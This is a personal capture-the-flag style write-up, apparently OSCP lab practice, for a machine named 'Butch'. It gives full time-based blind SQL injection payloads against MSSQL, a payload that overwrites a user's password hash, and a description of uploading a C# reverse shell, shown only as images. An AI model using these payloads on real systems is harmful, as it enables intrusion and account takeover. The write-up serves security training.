# Butch

Butch

Monday, 21 March 2022

2:38 pm

Nmap scan reveals this about the machine:

!\[\[97\_Butch\_image001.png]]

When scanning for versions, this one seems to be tcpwrapped a lot.d

Port 450 has a web server, with a login that works.

!\[\[97\_Butch\_image002.png]]

&#x20;

This is clearly a hint towards SQL injection, and we cannot use SQLMap when doing SQL Injection during OSCP.

&#x20;

So for this, we would need to create our own little script that would get the web page and test payloads for us.

&#x20;

Anyways the following payload gets us a 10 second delay:

WAITFOR DELAY '0:0:10'--

&#x20;

If we add a condition to that, we get this:

'IF (1=1) WAITFOR DELAY '0:0:10'--

&#x20;

&#x20;

Should we change the condition, we would get no delay at all.

Now, we can check users using this payload:

&#x20;

'if (select user) = 'admin' waitfor delay '0:0:10'--

&#x20;

If the user exists on the database, then there would be a time delay of 10 seconds.

I guessed the user as butch, and got a delay there.

&#x20;

So we have identified the user of which the box relies on.

&#x20;

Now, we just need to identify more of the stuff within the database, and my first guess is to figure out the user table and what it has within it.

After googling, it tells me that the tables stored within the Microsoft SQL database are called sys.tables.

&#x20;

!\[\[97\_Butch\_image003.png]]

This forum on Microsoft at least tells me what are the things that are within tables.

&#x20;

So sys.tables is the one that is similar to information\_schema stuff that we use for UNION attacks.

From this, we are able to determine possible table names that exist on the database.

&#x20;

'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--

&#x20;

This is the attack that I used, and checking the table name users gives me a delay.

&#x20;

So from this, we are able know that the table users exists on the database.

!\[\[97\_Butch\_image004.png]]

&#x20;

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object\_id = t.object\_id and t.name='users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--

&#x20;

This next payload has identified that username is indeed a column within the table of users.

&#x20;

Now, we should identify whether password is one of them.

&#x20;

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object\_id = t.object\_id and t.name='users' and c.name = 'password\_hash')=1) WAITFOR DELAY '0:0:10';--

&#x20;

Password was not a column in this. I went to google for possible password columns and found this on Github.

!\[\[97\_Butch\_image005.png]]

&#x20;

Perhaps it is stored as a password\_hash.\


'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object\_id = t.object\_id and t.name='users' and c.name = 'password\_hash')=1) WAITFOR DELAY '0:0:10';--

&#x20;

This payload gave me the next step, which was that there was a password\_hash column.

&#x20;

We already know the user is named butch from here, and can either find his password hash through a painful manual process or update it to something else.

&#x20;

{width="6.020833333333333in" height="1.5625in"}

We can do something like

'; UPDATE users SET password\_hash = '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824' WHERE username='butch'--

&#x20;

This works out.

I remembered that they hash stuff in this database, and from here we are able to get a SHA256 hash and hash it for the payload above.

&#x20;

I updated the database with the password hello, and logged in!

!\[\[97\_Butch\_image007.png]]

&#x20;

Regular web shells don't work here, and I was close to giving up ngl. I bought a hint and it revealed this:

!\[\[97\_Butch\_image008.png]]

Some source code analysis is needed here?

!\[\[97\_Butch\_image009.png]]

The dev directory looks good.

&#x20;

&#x20;

!\[\[97\_Butch\_image0010.png]]

&#x20;

This would be the stuff within the directory.

!\[\[97\_Butch\_image0011.png]]

Sitemaster reveals this, and it seems that the language is C# and also that it inherits some from site.master.cs

&#x20;

Seems that we would need a C# reverse shell!

&#x20;

!\[\[97\_Butch\_image0012.png]]

This should work. Quick Github search reveals some.

Port 4444 is blocked by some WAF, hence I used the ports that were open.

&#x20;

However, this still did not work as the shell was not executing.

&#x20;

We can then see that it Inherits part of the code, hence the function within C# would have to be that one. Based on the name of the code, we have to make it that same file as well. I think the aim here is to overwrite the code with our reverse shell, as that is the only file to be executed.

&#x20;

!\[\[97\_Butch\_image0013.png]]

This would be the sitemaster.cs code that is being used.

&#x20;

&#x20;

!\[\[97\_Butch\_image0014.png]]

We would need to merge these together in our reverse shell.

&#x20;

!\[\[97\_Butch\_image0015.png]]

The rest of the shell would be using the default reverse shell stuff.

&#x20;

Upload this as site.master.cs, and from there we would get a root shell:

!\[\[97\_Butch\_image0016.png]]

&#x20;

!\[\[97\_Butch\_image0017.png]]

&#x20;

!\[\[97\_Butch\_image0018.png]]

&#x20;

Very interesting machine, Blind SQL Manual is annoying but still possible.

&#x20;

&#x20;
